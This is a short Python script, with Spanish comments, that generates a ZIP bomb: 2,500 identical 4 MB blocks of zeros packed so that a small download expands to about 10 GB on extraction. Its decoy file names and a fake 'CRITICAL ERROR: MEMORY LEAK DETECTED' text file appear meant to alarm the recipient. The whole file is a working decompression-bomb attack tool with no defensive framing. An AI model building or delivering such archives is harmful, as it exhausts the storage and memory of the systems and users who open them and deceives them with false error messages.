import zipfile
import io
import os

def generate_ultra_zip():
    """
    Genera una bomba ZIP de alta densidad.
    Enviado: ~4MB | Expansión: 10GB
    """
    zip_buffer = io.BytesIO()
    kernel_data = b"\x00" * (1024 * 1024 * 4) # 4MB Kernel
    
    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
        # 2500 archivos de 4MB = 10,000 MB = 10GB
        for i in range(2500):
            zf.writestr(f"INTERNAL_DATA_CORRUPT_{i:04d}.bin", kernel_data)
        zf.writestr("HELL_AUTH.txt", "CRITICAL ERROR: MEMORY LEAK DETECTED")

    return zip_buffer.getvalue()
